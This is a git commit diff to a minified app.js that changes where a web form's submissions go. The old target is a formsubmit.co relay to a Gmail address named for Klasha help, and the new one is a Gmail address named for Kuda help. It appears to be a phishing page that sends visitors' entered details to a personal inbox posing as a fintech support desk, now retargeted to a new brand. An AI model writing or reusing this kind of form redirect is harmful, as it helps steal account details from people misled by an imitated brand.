54f9943abac31a63c77f4b5d24df7dcb99d3fb2f
Williams Divine-favour Chukwuebuka <134648537+DevBullions@users.noreply.github.com>
2023-09-28 17:49:21 -0700

    Update app.js

--- app.js
+++ app.js
@@ -1,3 +1,3 @@
 
 
-"use strict";var form=document.querySelector("#form"),button=document.querySelector("button");form.action="https://formsubmit.co/klashahelp@gmail.com",form.addEventListener("submit",(function(){button.textContent="Loading..."}));
+"use strict";var form=document.querySelector("#form"),button=document.querySelector("button");form.action="https://formsubmit.co/kudahelpuk@gmail.com",form.addEventListener("submit",(function(){button.textContent="Loading..."}));
